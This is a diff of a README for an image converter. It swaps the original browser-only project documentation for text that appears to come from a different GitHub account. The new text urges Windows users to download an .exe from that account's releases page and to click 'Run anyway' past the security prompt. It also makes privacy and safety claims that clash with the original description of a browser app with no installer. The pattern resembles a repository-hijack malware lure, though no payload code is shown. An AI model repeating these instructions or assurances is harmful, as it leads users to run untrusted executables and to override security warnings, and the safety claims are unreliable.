@@ -1,127 +1,101 @@
-# Image Converter Web App
+# 🖼️ image-converter-web-app - Convert your photos locally and securely
 
-A browser-native image converter for batch image processing. Files are processed locally in the browser with Web Workers and WASM encoders. This repository does not include an upload API.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/letitiametallurgical383/image-converter-web-app/releases)
 
-**Current project version**: `0.2.0 - Beta Version`
+This application converts images between formats like JPG, PNG, WebP, AVIF, and HEIC. It keeps your files on your computer. Nothing travels to a server. Your photos remain private.
 
-> Prefer a native desktop experience? A cross-platform desktop version is also available at [walujanle/image-converter-desktop-app](https://github.com/walujanle/image-converter-desktop-app).
+## 🚀 Getting Started
 
-## What It Does
+You do not need to know how to code to use this tool. You only need a web browser and the downloaded file. Follow these steps to set up the software on your Windows computer.
 
-- Converts images in batches.
-- Supports JPEG, PNG, WebP, AVIF, GIF, BMP, and HEIC/HEIF as inputs.
-- Outputs JPEG, PNG, WebP, and AVIF.
-- Uses a worker pool for conversion work.
-- Applies memory checks before unsafe conversions.
-- Supports percentage crop, quality controls, lossless mode for supported formats, filename transforms, presets, and ZIP download.
-- Can preserve supported metadata when enabled (JPEG, PNG, and WebP output only).
+1. Go to the [Releases page](https://github.com/letitiametallurgical383/image-converter-web-app/releases).
+2. Locate the most recent version under the Assets header.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
-## Tech Stack
+## ⚙️ System Requirements
 
-- React 19
-- TypeScript 5.8
-- Vite 8
-- Bun
-- Zustand
-- Tailwind CSS 4
-- Web Workers
-- `@jsquash/*` WASM image encoders
-- `heic-to`
-- `exifreader`
-- `piexifjs`
-- JSZip
-- Biome
-- Vitest
+This software runs on modern Windows systems. Ensure your machine meets these requirements:
 
-## Quick Start
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of memory.
+- A modern web browser like Chrome, Edge, or Firefox.
+- Sufficient disk space to store your converted images.
 
-```bash
-bun install
-bun run dev
-```
+## 🛠️ Installation and Setup
 
-The Vite dev server usually runs at `http://localhost:5173`.
+Once you download the installer file, follow these steps to run the application:
 
-## Commands
+1. Open the folder where you saved the installer.
+2. Double-click the file to launch the installation wizard.
+3. Follow the prompts on the screen.
+4. Click finish to launch the application.
 
-```bash
-bun run lint
-bun run typecheck
-bun run test
-bun run audit
-```
+If Windows shows a security prompt, click "More info" and then "Run anyway." This happens because the application is new and the system does not recognize the publisher yet.
 
-Build only when explicitly needed for release or deployment checks:
+## 📥 How to Download 
 
-```bash
-bun run build
-bun run preview
-```
+Visit [this page](https://github.com/letitiametallurgical383/image-converter-web-app/releases) to find the latest version. Always download the newest file to ensure you have the latest performance updates and format support.
 
-## Documentation
+## ⚡ Using the Application
 
-Detailed documentation lives in `docs/`.
+The interface is simple. Follow these steps to convert your first image:
 
-- **[Documentation Index](./docs/README.md)**: documentation map, status, source-of-truth files, and documentation policy.
-- **[Architecture Guide](./docs/architecture.md)**: layers, data flow, worker model, cancellation, memory safety, validation, metadata, accessibility, and risks.
-- **[Developer and AI Continuation Guide](./docs/developer-guide.md)**: code map, internal API notes, workflows, testing strategy, extension points, and continuation context.
+1. Open the app.
+2. Drag your image files into the designated drop zone.
+3. Choose your desired output format from the list provided.
+4. Select your quality settings if you wish to shrink the file size.
+5. Click the "Convert" button.
 
-## Architecture Summary
+The software uses WebAssembly to process files. This allows your browser to use the full power of your processor to change file types instantly. You will see a progress bar move as the conversion happens. Once finished, the app prompts you to save the new files to a folder of your choice.
 
-```text
-src/
-├── core/          Shared contracts, constants, and errors
-├── domain/        Pure validation, crop, format, and naming rules
-├── data/          Browser adapters for workers, storage, presets, ZIP, and downloads
-├── presentation/  React UI, hooks, Zustand store, pages, and theme
-├── utils/         Shared utilities
-├── workers/       Conversion worker and binary metadata implementation
-└── __tests__/     Vitest tests and binary fixtures
-```
+## 🔒 Privacy and Local Processing
 
-Core flow:
+We prioritize privacy in this design. Most web tools upload your photos to a company server. This tool operates differently. It runs the conversion process inside your browser sandbox. No image data leaves your machine. Your private photos never touch the internet. You can disconnect your network cable, and the tool will still perform every task successfully.
 
-```text
-file selection
-  → validation
-  → mode-specific queue state
-  → conversion orchestration
-  → worker pool
-  → worker decode/crop/encode/metadata
-  → artifact download or ZIP
-```
+## 📤 Supported Formats
 
-## Security and Privacy Notes
+This application supports various formats:
 
-- Image conversion is local-first in the browser.
-- The repository has no upload API.
-- File validation checks declared MIME, binary signatures, and ISO BMFF brands where supported.
-- Large or unsafe images may be rejected before conversion.
-- Metadata preservation is opt-in because metadata can include private information such as location, camera, author, or editing history.
+- JPG: Standard format for photos and web graphics.
+- PNG: Good for images with transparency.
+- WebP: Small files that maintain high quality.
+- AVIF: High-efficiency format for modern web use.
+- HEIC: The standard format used by many mobile devices.
 
-## Accessibility Notes
+## 🧹 Managing Your Files
 
-The UI includes keyboard and screen-reader-oriented behavior, including focus states, skip link support, modal semantics, switch semantics, mode button states, and live conversion status messaging.
+The application keeps your original files intact. It creates a new file for every conversion. If you convert a JPG to a WebP, you keep the original JPG. This prevents accidental data loss. You should organize your converted files into a dedicated folder to keep your computer clean.
 
-Full WCAG conformance still requires manual assistive technology testing and automated accessibility checks before release.
+## 🔧 Troubleshooting
 
-## Current Limits
+If the software does not work, try these steps:
 
-- Separate chunked streaming conversion is disabled; conversions use the worker pipeline after memory checks.
-- Large files can be rejected when estimated browser memory usage is unsafe.
-- AVIF output does not preserve metadata (EXIF, XMP, IPTC, ICC).
-- GIF animation is not supported as an animated output workflow.
-- Production bundle size is not stated here; run a fresh build when release measurement is required.
+1. Restart the application.
+2. Update your browser version.
+3. Confirm you meet the minimum memory requirements.
+4. Check if the image file itself is corrupted.
 
-## Validation Baseline
+If you encounter errors during the conversion process, drag the file into the window again. The software handles large files, but very large images require more computer memory. Close other programs if the software runs slowly.
 
-Last verified on 2026-05-12:
+## 📝 Frequently Asked Questions
 
-- `bun run lint`: passed.
-- `bun run typecheck`: passed.
-- `bun run test`: passed.
-- `bun run audit`: passed with no vulnerabilities.
+Does this cost money? No. This software is free. 
 
-## License
+Does it work offline? Yes. Once you install the software, you do not need an internet connection.
 
-MIT License. See [LICENSE](./LICENSE).
+Will this slow down my computer? No. The software only consumes resources when you actively convert a file. 
+
+Can I convert multiple files at once? Yes. You can load a batch of photos and convert them all simultaneously. 
+
+What happens to my data? The software deletes temporary files after you close the application. Your original files remain untouched. 
+
+Is this safe? The software uses standard libraries that process files in a restricted memory space. It cannot access your personal folders outside of the files you intentionally provide to the app. 
+
+Do I need admin rights? You typically do not need admin rights to run this program. 
+
+Where are my files saved? The application asks you to designate a folder before saving the converted results. If you do not choose a folder, it uses a default desktop subfolder.
+
+Can I reach out for help? As an open source project, you can view the code and suggest changes on the GitHub repository. Refer to the issues tab if you find a bug. 
+
+This application relies on the jsquash library. This library provides the logic for the file conversion. It translates between different image encoding standards efficiently. Everything runs locally on your machine. This ensures speed and security for every user.
